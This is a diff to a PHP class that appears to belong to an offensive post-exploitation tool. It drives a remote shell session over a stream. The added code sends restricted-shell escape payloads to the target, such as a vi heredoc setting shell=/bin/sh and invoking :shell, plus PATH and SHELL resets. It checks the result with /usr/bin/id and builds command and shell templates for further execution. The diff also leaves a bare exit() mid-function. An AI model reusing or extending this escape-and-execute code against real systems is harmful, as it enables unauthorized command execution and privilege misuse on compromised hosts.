@@ -746,19 +746,19 @@ class SERVICE4COM extends AUTH {
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 
-                $rst_id = stream_get_contents($stream);
-                
+                $rst_id = stream_get_contents($stream);                
                 list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
                 if (!empty($uid_name)){
                     $cmd = "%CMD%";                   
-                    $template_id_new = "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; %ID%";
-                    $template_cmd_new = str_replace("%CMD%", $data_id, $template_cmd);
-                    $template_shell_new = str_replace("%CMD%", " $data_id; $template_id_new", $template_cmd);
-                    $template_shell_new = str_replace("%CMD%","%SHELL%", $template_shell_new);
+                    $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
+                    $template_cmd_new = str_replace("%ID%", "%CMD%", $template_id_new);
+                    $template_shell_new = str_replace("%CMD%","%SHELL%", $template_cmd_new);
                     return array($stream,$template_id_new,$template_cmd_new,$template_shell_new) ;
                     
                 }
+                $this->pause();
                 
+
                 
                 $data = "help";
                 $this->article("DATA", $data);
@@ -835,7 +835,57 @@ class SERVICE4COM extends AUTH {
                 echo "$tmp\n";
                 
                 
+                $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\n#\" ; export SHELL=/bin/bash:\$SHELL ; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; /usr/bin/id";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
                 
+                $rst_id = stream_get_contents($stream);
+                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
+                if (!empty($uid_name)){
+                    $cmd = "%CMD%";
+                    $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
+                    $template_cmd_new = str_replace("%ID%", "%CMD%", $template_id_new);
+                    $template_shell_new = str_replace("%CMD%","%SHELL%", $template_cmd_new);
+                    return array($stream,$template_id_new,$template_cmd_new,$template_shell_new) ;
+                    
+                }
+                $this->pause();
+                
+                
+                $data = "vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\n# ; export SHELL=/bin/bash:\$SHELL ; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; /usr/bin/id";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                
+                $rst_id = stream_get_contents($stream);
+                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
+                if (!empty($uid_name)){
+                    $cmd = "%CMD%";
+                    $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
+                    $template_cmd_new = str_replace("%ID%", "%CMD%", $template_id_new);
+                    $template_shell_new = str_replace("%CMD%","%SHELL%", $template_cmd_new);
+                    return array($stream,$template_id_new,$template_cmd_new,$template_shell_new) ;
+                    
+                }
+                $this->pause();
+                
+                
+                $data = "export SHELL=/bin/bash:\$SHELL ; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; /usr/bin/id";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                
+                $rst_id = stream_get_contents($stream);
+                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
+                if (!empty($uid_name)){
+                    $cmd = "%CMD%";
+                    $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
+                    $template_cmd_new = str_replace("%ID%", "%CMD%", $template_id_new);
+                    $template_shell_new = str_replace("%CMD%","%SHELL%", $template_cmd_new);
+                    return array($stream,$template_id_new,$template_cmd_new,$template_shell_new) ;
+                    
+                }
+                $this->pause();
+
+                exit();
                 
                 $data = "printf \"%s\\n\" $0";
                 $this->article("DATA", $data);
